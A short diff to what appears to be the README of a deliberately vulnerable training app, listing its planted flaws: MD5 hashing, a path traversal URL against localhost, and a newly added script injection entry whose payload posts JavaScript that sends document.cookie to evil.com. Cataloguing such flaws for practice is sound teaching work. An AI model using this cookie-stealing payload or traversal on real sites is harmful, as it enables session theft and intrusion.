@@ -29,3 +29,5 @@ Reset the database with `npm run sync`.
 - Cryptographic Failures -> MD5 hashing
 - Path traversal
     - http://localhost:4200/api/message/company/../package.json
+- Script injection
+    - POST /api/message `<script>fetch(`http://evil.com/${document.cookie}`)</script>`
